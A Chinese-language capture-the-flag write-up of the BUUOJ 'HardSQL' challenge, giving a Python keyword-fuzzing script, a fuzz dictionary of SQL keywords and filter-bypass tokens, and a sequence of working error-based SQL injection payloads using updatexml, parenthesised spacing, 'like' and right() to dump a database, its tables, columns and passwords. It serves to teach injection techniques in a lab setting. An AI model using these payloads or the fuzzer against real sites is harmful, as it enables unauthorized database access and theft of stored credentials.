# HardSQL

[题目地址](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL)

这竟然是我第一次遇见报错注入。随便输了个“万能密码”，显示被过滤了。是时候给自己找个[fuzz测试脚本](https://blog.csdn.net/mochu7777777/article/details/108073359)了。

```python
import requests
METHOD='get'
URL="http://de8226be-4321-4e1a-87bc-6c37a470b317.node4.buuoj.cn:81/check.php?username={0}&password=a"
FILTER="你可别被我逮住了，臭弟弟"
with open("./fuzz.txt",'r') as f:
    sql_char=f.read().split('\n')
for char in sql_char:
    if METHOD=='get':
        url=URL.format(char)
        res = requests.get(url)
    if FILTER in res.text:
        print("该字符是非法字符: {0}".format(char))
    else:
        print("通过: {0}".format(char))
```

附赠fuzz字典。

```
length 
Length
+
handler
like
LiKe
select
SeleCT 
sleep
SLEEp
database
DATABASe
delete
having
or
oR
as
As
-~
BENCHMARK
limit
LimIt
left
Left
select
SELECT
insert
insERT
INSERT
right
#
--+
INFORMATION
--
;
!
%
+
xor
<>
(
>
<
)
.
^
=
AND
ANd
BY
By
CAST
COLUMN
COlumn
COUNT
Count
CREATE
END
case
'1'='1
when
admin'
"
length 
+
REVERSE

ascii
ASSIC
ASSic
select 
database
left
right
union
UNIon
UNION
"
&
&&
||
oorr
/
//
//*
*/*
/**/
anandd
GROUP
HAVING
IF
INTO
JOIN
LEAVE
LEFT
LEVEL
sleep
LIKE
NAMES
NEXT
NULL
OF
ON
|
infromation_schema
user
OR
ORDER
ORD
SCHEMA
SELECT
SET
TABLE
THEN
UNION
UPDATE
USER
USING
VALUE
VALUES
WHEN
WHERE
ADD
AND
prepare
set
update
delete
drop
inset
CAST
COLUMN
CONCAT
GROUP_CONCAT
group_concat
CREATE
DATABASE
DATABASES
alter
DELETE
DROP
floor
rand()
information_schema.tables
TABLE_SCHEMA
%df
concat_ws()
concat
LIMIT
ORD
ON
extractvalue
order 
CAST()
by
ORDER
OUTFILE
RENAME
REPLACE
SCHEMA
SELECT
SET
updatexml
SHOW
SQL
TABLE
THEN
TRUE
instr
benchmark
format
bin
substring
ord

UPDATE
VALUES
VARCHAR
VERSION
WHEN
WHERE
/*
`
  
a a
,
users
%0a
%0A
%0b
mid
for
BEFORE
REGEXP
RLIKE
in
sys schemma
SEPARATOR
XOR
CURSOR
FLOOR
sys.schema_table_statistics_with_buffer
INFILE
count
%0c
from
%0d
%a0
=
@
else
%27
%23
%22
%20
```

测出来一大波都不能用，union，=号都没有逃过一劫。但是报错注入的灵魂函数之一[updatexml](https://www.cnblogs.com/c1047509362/p/12806297.html)可以用，考点是啥不言而喻了吧？参考波[wp](https://blog.csdn.net/l2872253606/article/details/125151924),空格被过滤了，用括号绕过。

- 'or(updatexml(0,concat(0x5e,database()),0))#

0x5e在updataxml中不合法，于是报错，报错时会把敏感信息带出来。爆完库名geek，爆表。=号被过滤了不要慌，[like](https://blog.csdn.net/c_base_jin/article/details/74360242)绕过。

- 1'or(updatexml(0,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),0))#

报错注入没啥说的，跟union一样有格式，要爆的内容方concat第二个参数就得了，该怎么查询就怎么查询。得到表名H4rDsq1。继续爆字段。

- 1'or(updatexml(0,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),0))#

flag应该在password里吧，如果不在也能一个一个试，报错注入效率也是挺高的。

- 1'or(updatexml(0,concat(0x5e,(select(group_concat(password))from(H4rDsq1))),0))#

因为报错只能回显有限数量的字符（32位），所以我们只有半个flag。没关系，用[right](https://www.yiibai.com/sql/sql-right-function.html)函数截取flag右边缺少的部分。

- 1'or(updatexml(0,concat(0x5e,right((select(group_concat(password))from(H4rDsq1)),31)),0))#

去除重复部分拼接起来就是flag。